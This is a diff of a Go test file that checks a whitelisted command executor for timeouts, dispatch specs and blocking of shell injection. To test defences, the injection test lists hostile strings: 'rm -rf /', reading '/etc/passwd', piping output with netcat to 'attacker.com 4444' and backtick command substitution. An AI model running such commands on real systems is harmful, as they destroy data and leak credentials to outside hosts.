@@ -6,32 +6,32 @@ import (
 	"time"
 )
 
-func TestExecuteCommand_Whitelist(t *testing.T) {
+func TestExecuteCommand_NotWhitelisted(t *testing.T) {
 	result := ExecuteCommand("rm -rf /")
 
 	if result.Success {
-		t.Error("expected failure for non-whitelisted command")
+		t.Fatal("non-whitelisted command must never succeed")
 	}
-	if result.Error == "" {
-		t.Error("expected error message for blocked command")
+	if result.TimedOut {
+		t.Error("whitelist check should be instant, not timeout")
+	}
+	if result.Duration > time.Second {
+		t.Error("whitelist check should be instant")
 	}
 }
 
 func TestExecuteCommand_Timeout(t *testing.T) {
 	if runtime.GOOS == "windows" {
-		// Sur Windows, on vérifie juste que le timeout est bien détecté
-		// via une commande whitelistée avec un timeout quasi-zéro
 		result := ExecuteCommandWithTimeout("uptime", 1*time.Nanosecond)
-		// Soit timeout, soit erreur — dans les deux cas pas de succès
 		if result.Success {
 			t.Error("expected failure with 1ns timeout")
 		}
 		return
 	}
 
-	// Linux/macOS — sleep est tué proprement par SIGKILL
-	allowedCommands["sleep 5"] = true
-	defer delete(allowedCommands, "sleep 5")
+	// Sur Linux — ajoute temporairement sleep dans les specs de test
+	commandSpecs["sleep 5"] = CommandSpec{bin: "sleep", args: []string{"5"}}
+	defer delete(commandSpecs, "sleep 5")
 
 	result := ExecuteCommandWithTimeout("sleep 5", 200*time.Millisecond)
 	if !result.TimedOut {
@@ -40,16 +40,9 @@ func TestExecuteCommand_Timeout(t *testing.T) {
 }
 
 func TestExecuteCommand_ValidCommand(t *testing.T) {
-	var cmd string
-	if runtime.GOOS == "windows" {
-		cmd = "uptime"
-	} else {
-		cmd = "uptime"
-	}
+	result := ExecuteCommandWithTimeout("uptime", 5*time.Second)
 
-	result := ExecuteCommandWithTimeout(cmd, 5*time.Second)
-
-	if !result.Success && result.TimedOut {
+	if result.TimedOut {
 		t.Error("valid command should not timeout with 5s limit")
 	}
 	if result.Duration <= 0 {
@@ -63,21 +56,36 @@ func TestCommandResult_TimedOutDisplay(t *testing.T) {
 		TimedOut: true,
 		Duration: 200 * time.Millisecond,
 	}
-
-	// Juste vérifier que Display() ne panic pas
 	r.Display()
 }
 
-func TestExecuteCommand_NotWhitelisted(t *testing.T) {
-	result := ExecuteCommand("cat /etc/passwd")
+func TestExecuteCommand_DirectDispatch(t *testing.T) {
+	// Vérifie que la spec existe pour chaque commande whitelistée
+	expected := []string{"docker ps", "docker stats", "uptime", "df -h", "free -h"}
+	for _, cmd := range expected {
+		if _, ok := commandSpecs[cmd]; !ok {
+			t.Errorf("command '%s' missing from commandSpecs", cmd)
+		}
+	}
+}
 
-	if result.Success {
-		t.Fatal("non-whitelisted command must never succeed")
+func TestExecuteCommand_NoShellInjection(t *testing.T) {
+	// Une tentative d'injection via une commande whitelistée modifiée
+	// doit être bloquée par la whitelist
+	injections := []string{
+		"df -h; rm -rf /",
+		"uptime && cat /etc/passwd",
+		"free -h | nc attacker.com 4444",
+		"docker ps`whoami`",
 	}
-	if result.TimedOut {
-		t.Error("non-whitelisted command should fail immediately, not timeout")
-	}
-	if result.Duration > time.Second {
-		t.Error("whitelist check should be instant")
+
+	for _, cmd := range injections {
+		result := ExecuteCommand(cmd)
+		if result.Success {
+			t.Errorf("injection attempt should be blocked: '%s'", cmd)
+		}
+		if result.Error == "" {
+			t.Errorf("blocked command should have error message: '%s'", cmd)
+		}
 	}
 }
